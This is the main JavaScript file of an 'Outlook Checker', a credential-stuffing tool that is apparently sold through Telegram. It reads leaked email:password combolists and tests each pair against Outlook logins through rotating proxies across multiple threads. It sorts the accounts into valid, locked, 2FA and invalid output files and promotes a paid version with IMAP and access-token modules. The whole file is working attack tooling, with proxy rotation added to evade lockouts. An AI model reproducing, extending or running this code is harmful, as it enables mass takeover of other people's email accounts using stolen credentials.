const { login_func } = require('./modules/login.js');
const { thunderbird_func } = require('./modules/thunderbird.js'); // Purchase the full version: https://t.me/etherialdev
const { accesstoken_func } = require('./modules/accesstoken.js'); // Purchase the full version: https://t.me/etherialdev
const { imap_func } = require('./modules/imap.js'); // Purchase the full version: https://t.me/etherialdev
const { CookieJar } = require('tough-cookie');
const { get_sections } = require('./utils/separator.js');
const fs = require('fs');
const { Log } = require('./modules/logger.js');
const path = require('path');

const got = require('got');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { HttpsProxyAgent } = require('https-proxy-agent');


let proxy_type;
let inbox_filter;
let thread_num;
let retry_limit;

try {
    const config = require(path.join(process.cwd(), 'config.js'));
    thread_num = config.threads;
    proxy_type = config.proxy_type.toLowerCase();
    inbox_filter = config.inbox_filter;
    retry_limit = config.retry_limit;
} catch (error) {
    Log.Error("Config file malformed: download the source code again from: https://github.com/etherialdev/outlook-checker")
}

async function worker(session, email, password) {
    try {
        const login = await login_func(session, email, password)
        if (login.status == "already_connected") {
            Log.Success(`Valid account! | ${email}:${password}`)
            return {status: "success", domain_list: null, access_token: null, response: null}
        }else if (login.status == "success") {
            Log.Success(`Valid account! | ${email}:${password}`)
            return {status: "success", domain_list: null, access_token: null, response: null}
        }else{
            return {status: login.status, domain_list: null, access_token: null, response: null}
        }
    } catch (error) {
        return {status: "retry", domain_list: null, access_token: null, response: error}
    }
}

async function process_element() {
    return new Promise((resolve) => {
        setTimeout(() => {
            resolve();
        }, 100); 
    });
}

async function start(section, proxies) {
    try {
        for (let index = 0; index < section.length; index++) {
            const data_line = section[index];
            const parts = data_line.split(':');
            const email = parts[0].trim();
            const password = parts[1].trim()
            let retry_count = 0;

            process_element()
            while (retry_count <= retry_limit) {
                retry_count++;
                const proxy = proxies[Math.floor(Math.random() * proxies.length)];

                let proxy_url;
                let proxyAgent;

                if (proxy_type.includes("socks")) {
                    proxy_url = `${proxy_type}://${proxy}`;
                    proxyAgent = new SocksProxyAgent(proxy_url);
                }else{
                    proxy_url = `${proxy_type}://${proxy}`;
                    proxyAgent = new HttpsProxyAgent(proxy_url);
                }

                const cookieJar = new CookieJar();
                const session = got.default.extend({
                    cookieJar,
                    agent: {
                        https: proxyAgent
                    }
                });

                const status = await worker(session, email, password);
                if (status.status == "success") {
                    fs.appendFileSync(path.join(process.cwd(), 'output', 'valid.txt'), `${email}:${password}\n`, 'utf8');
                }else if(status.status == "locked"){
                    Log.Debug(`Locked account | ${email}:${password}`)
                    fs.appendFileSync(path.join(process.cwd(), 'output', 'phone_locked.txt'), `${email}:${password}\n`, 'utf8');
                }else if(status.status == "2fa_detected"){
                    Log.Debug(`2fa detected | ${email}:${password}`)
                    fs.appendFileSync(path.join(process.cwd(), 'output', '2fa.txt'), `${email}:${password}\n`, 'utf8');
                }else if(status.status == "invalid"){
                    Log.Debug(`Invalid account | ${email}:${password}`)
                    fs.appendFileSync(path.join(process.cwd(), 'output', 'invalid.txt'), `${email}:${password}\n`, 'utf8');
                }else if(status.status == "passkey_interrupt"){
                    Log.Warning(`Passkey interrupt happened, need to retry ${email}:${password})`)
                }else if(status.status == "recovery"){
                    Log.Debug(`Locked account (Recovery) | ${email}:${password}`)
                    fs.appendFileSync(path.join(process.cwd(), 'output', 'locked.txt'), `${email}:${password} | Recovery\n`, 'utf8');
                }else if(status.status == "security_info_change"){
                    Log.Debug(`Locked account (security info change pending) | ${email}:${password}`)
                    fs.appendFileSync(path.join(process.cwd(), 'output', 'locked.txt'), `${email}:${password} | Security info change pending\n`, 'utf8');
                }else if(status.status == "too_many_tries"){
                    Log.Debug(`Too many tries (login blocked) | ${email}:${password}`)
                    fs.appendFileSync(path.join(process.cwd(), 'output', 'locked.txt'), `${email}:${password} | Too many tries (login blocked)\n`, 'utf8');
                }else{
                    Log.Error(`Proxy timeout error`);
                }   
                if (status.status !== "retry" && status.status !== "passkey_interrupt") {
                    break;
                }
            }
            if (retry_count > retry_limit) {
                fs.appendFileSync(path.join(process.cwd(), 'output', 'failed_check.txt'), `${email}:${password}\n`, 'utf8');
            }
        }   
    } catch (error) {
        Log.Error(`Error: ${error}`)
    }
}

async function check_config() {
    const is_empty = file => fs.statSync(file).size > 0;
    let value = 0;
    const lines = fs.readFileSync(path.join(process.cwd(), 'input', 'combolist.txt'), 'utf-8').split('\n').filter(line => line.trim());
    lines.forEach(() => value++);

    const errors = [];
    if (fs.existsSync("./config.js")) {
        if (!['http', 'socks4', 'socks5'].includes(proxy_type)) {
            errors.push('proxy_type_error');
        }
        if (!Number.isInteger(thread_num)) {
            errors.push('thread_num_error');
        }
        if (!Number.isInteger(retry_limit)) {
            errors.push('retry_limit_error');
        }
        if (inbox_filter.every(item => item === "")) {
            errors.push('inbox_filter_empty');
        }
        if (!is_empty('input/proxies.txt')) {
            errors.push('empty_proxies_error')
        }
        if (!is_empty('input/combolist.txt')) {
            errors.push('empty_combolist_error')
        }
        if (thread_num > value) {
            errors.push('thread_num_error_2')
        }

    } else {
        errors.push('config_file_missing');
    }
    if (errors.length > 0) {
        return errors;
    }
}

function wait(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function main() {
    Log.Warning("Inbox filter is in the full version. Buy it on Telegram: t.me/etherialdev Free release at 200 stars!");
    await wait(5000);
    if ((proxy_type != "undefined" & thread_num != "undefined") & inbox_filter != "undefined" & retry_limit != "undefined") {
        const error_statuses = {
            proxy_type_error: false,
            inbox_filter_empty: false,
            config_file_missing: false,
            thread_num_error: false,
            empty_proxies_error: false,
            empty_combolist_error: false,
            thread_num_error_2: false,
            retry_limit_error: false
        };

        const errors = await check_config()
        if (errors) {
            for (const error of Object.keys(error_statuses)) {
                error_statuses[error] = errors.includes(error);
            }   
        }
        if (error_statuses.config_file_missing) {
            Log.Error("Config file missing, download the source code again from: https://github.com/etherialdev/outlook-checker");
        }
        if (error_statuses.retry_limit_error) {
            Log.Error("Wrong retry_limit value, please check the config.js file!");
        }
        if (error_statuses.proxy_type_error) {
            Log.Error("Wrong proxy type, please check the config.js file! (supported proxy types: HTTP, SOCKS4, SOCKS5)");
        }
        if (error_statuses.inbox_filter_empty) {
            //Log.Warning("The inbox_filter in the config.js file was empty, input the site domains if you want to save the hits!");
        }
        if (error_statuses.thread_num_error) {
            Log.Error("The thread_num in the config file is not a number, please enter a number.");
        }
        if (error_statuses.empty_proxies_error) {
            Log.Error("The proxies.txt is empty, please input your proxies. format: username:password@hostname:port");
        }
        if (error_statuses.empty_combolist_error) {
            Log.Error("The combolist.txt is empty, please input your data. format: email:password");
        }
        if (error_statuses.thread_num_error_2) {
            Log.Error("The thread_num in the config file cannot be higher than the lines of the combolist.txt!")
        }

        if (!error_statuses.proxy_type_error && !error_statuses.proxy_check_error && !error_statuses.config_file_missing && !error_statuses.empty_proxies_error && !error_statuses.empty_combolist_error && !error_statuses.thread_num_error_2) {
            const sections = await get_sections(path.join(process.cwd(), 'input', 'combolist.txt'), thread_num);
            const proxy_data = fs.readFileSync(path.join(process.cwd(), 'input', 'proxies.txt'), 'utf8');
            const proxies = proxy_data.split('\n');
            let section_num = "1";
            for (let index = 0; index < thread_num; index++) {
                const section = sections[`section_${section_num}`];
                start(section, proxies);
                section_num++;
            }
        }
    }else{
        Log.Error("There are an issue with the config file, please check it!")
    }
}

process.stdout.write('\x1b]0;Outlook Checker | t.me/etherialdev\x07');
main()
setInterval(() => {}, 1000);